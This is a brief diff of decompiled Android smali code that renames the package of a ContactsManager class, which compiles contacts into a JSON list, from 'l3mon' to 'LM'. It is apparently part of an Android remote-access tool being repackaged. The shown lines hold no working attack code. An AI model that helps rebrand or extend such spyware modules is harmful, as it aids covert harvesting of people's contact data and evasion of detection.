@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/ContactsManager;
+.class public Lcom/etechd/LM/ContactsManager;
 .super Ljava/lang/Object;
 .source "ContactsManager.java"
 
@@ -34,7 +34,7 @@
 
     .line 17
     .local v3, "list":Lorg/json/JSONArray;
-    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/etechd/LM/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v4
 
